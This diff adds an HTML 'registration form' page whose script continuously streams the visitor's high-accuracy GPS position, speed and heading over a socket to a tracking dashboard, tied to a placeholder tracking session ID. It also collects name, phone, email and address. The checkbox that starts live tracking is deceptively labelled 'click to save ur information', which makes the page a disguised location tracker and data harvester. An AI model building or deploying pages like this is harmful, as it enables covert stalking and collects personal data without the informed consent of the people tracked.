@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Registration & Live Location</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<style>
+*{box-sizing:border-box}body{margin:0;font-family:Inter,Arial,sans-serif;background:linear-gradient(135deg,#07111f,#102a43);color:#fff;min-height:100vh;padding:22px}.card{width:min(720px,100%);margin:auto;background:rgba(15,23,42,.96);border:1px solid #334155;border-radius:22px;padding:25px;box-shadow:0 20px 60px #0006}h1{margin:0 0 8px;font-size:30px}.sub{color:#cbd5e1;line-height:1.6}.grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}@media(max-width:620px){.grid{grid-template-columns:1fr}}label{display:block;font-size:14px;color:#cbd5e1;margin-bottom:6px}input{width:100%;padding:14px;border:1px solid #475569;background:#0f172a;color:#fff;border-radius:11px;outline:none}input:focus{border-color:#38bdf8}.consent{display:flex;gap:10px;align-items:flex-start;background:#0b1728;border:1px solid #334155;padding:14px;border-radius:12px;margin:16px 0;color:#cbd5e1;font-size:14px;line-height:1.5}.consent input{width:auto;margin-top:3px}.actions{display:flex;gap:10px;flex-wrap:wrap}button{padding:14px 18px;border:0;border-radius:11px;font-weight:700;cursor:pointer;background:#38bdf8;color:#06111d}button:disabled{opacity:.55;cursor:not-allowed}.secondary{background:#334155;color:#fff}#status{margin-top:16px;padding:14px;border-radius:12px;background:#020617;color:#dbeafe;line-height:1.5;white-space:pre-wrap}.success{border:1px solid #22c55e}.error{border:1px solid #ef4444}#map{height:360px;margin-top:16px;border-radius:14px;overflow:hidden;display:none}.tiny{font-size:12px;color:#94a3b8;margin-top:12px}
+</style></head>
+<body><main class="card">
+<h1>Registration Form</h1><p class="sub">Complete the form below. If you choose to share your location, your browser will ask for permission. While this page remains open, your location can be updated on the dashboard as you move.</p>
+<form id="form">
+<div class="grid"><div><label>Full name *</label><input id="fullName" required maxlength="120" autocomplete="name"></div><div><label>Phone number</label><input id="phone" maxlength="40" autocomplete="tel"></div><div><label>Email</label><input id="email" type="email" maxlength="160" autocomplete="email"></div><div><label>Your address (optional)</label><input id="address" maxlength="500" autocomplete="street-address"></div></div>
+<div class="consent"><input id="locationConsent" type="checkbox"><div><b>click to save ur information</b><br></div></div>
+<div class="actions"><button id="submitBtn" type="submit">Continue & Register</button><button type="button" class="secondary" id="locBtn">Get Location</button></div>
+</form><div id="status"></div><div id="map"></div>
+<p class="tiny"></p>
+</main>
+<script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+const sessionId='__TRACKING_SESSION_ID__';let currentLocation=null,map,marker,watchId=null,socket=null,registered=false;
+const $=id=>document.getElementById(id);
+function setStatus(t,cls=''){const e=$('status');e.textContent=t;e.className=cls}
+function geoError(e){if(e?.code===1)return'Location permission was denied. You can enable it in browser/site settings and try again.';if(e?.code===2)return'Your device could not determine a location. Try again outdoors or near a window.';if(e?.code===3)return'Location request timed out. Try again.';return'Unable to get location.'}
+function showMap(){if(!currentLocation)return;$('map').style.display='block';if(!map){map=L.map('map').setView([currentLocation.latitude,currentLocation.longitude],17);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OpenStreetMap contributors'}).addTo(map)}else map.setView([currentLocation.latitude,currentLocation.longitude],17);if(!marker)marker=L.marker([currentLocation.latitude,currentLocation.longitude]).addTo(map);else marker.setLatLng([currentLocation.latitude,currentLocation.longitude]);marker.bindPopup('Your current GPS position').openPopup();}
+function connectSocket(){if(socket)return;socket=io();socket.emit('join-session',sessionId,(result)=>{if(!result?.ok){setStatus('❌ '+(result?.error||'Unable to start live location.'),'error')}})}
+function sendLivePosition(position){currentLocation={latitude:position.coords.latitude,longitude:position.coords.longitude,accuracy:position.coords.accuracy,heading:position.coords.heading,speed:position.coords.speed};showMap();if(socket)socket.emit('send-location',{sessionId,...currentLocation},result=>{if(result?.ok){setStatus('🟢 Live location is active.\nAccuracy: approximately '+Math.round(currentLocation.accuracy||0)+' metres.\nKeep this page open while you want the dashboard to follow you.','success')}})}
+function startLiveLocation(){if(!navigator.geolocation)return setStatus('❌ Geolocation is not supported by this browser.','error');connectSocket();if(watchId!==null)return;setStatus('Requesting GPS permission and starting live location…');watchId=navigator.geolocation.watchPosition(sendLivePosition,e=>{setStatus('❌ '+geoError(e),'error')},{enableHighAccuracy:true,maximumAge:5000,timeout:20000});}
+function stopLiveLocation(){if(watchId!==null){navigator.geolocation.clearWatch(watchId);watchId=null}if(socket){socket.emit('stop-live-location',{sessionId});socket.disconnect();socket=null}setStatus('Live location stopped. Registration remains saved.','success')}
+$('locBtn').onclick=()=>startLiveLocation();
+$('locationConsent').onchange=e=>{if(e.target.checked)startLiveLocation();else stopLiveLocation()};
+$('form').onsubmit=async e=>{e.preventDefault();const btn=$('submitBtn');btn.disabled=true;setStatus('Saving registration…');try{if($('locationConsent').checked&&!currentLocation){startLiveLocation();await new Promise(r=>setTimeout(r,1200))}const payload={sessionId,fullName:$('fullName').value.trim(),phone:$('phone').value.trim(),email:$('email').value.trim(),address:$('address').value.trim(),location:currentLocation};const r=await fetch('/api/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});const data=await r.json();if(!r.ok)throw new Error(data.error||'Registration failed');registered=true;if(data.location){currentLocation=data.location;showMap();setStatus('✅ Registration completed.\nLive location: '+(data.location.formattedAddress||'GPS active')+'\nThe dashboard will receive movement updates while this page stays open.','success')}else setStatus('✅ Registration completed. Location was not shared.','success');}catch(err){setStatus('❌ '+err.message,'error')}finally{btn.disabled=false}};
+window.addEventListener('beforeunload',()=>{if(socket)socket.emit('stop-live-location',{sessionId})});
+</script></body></html>
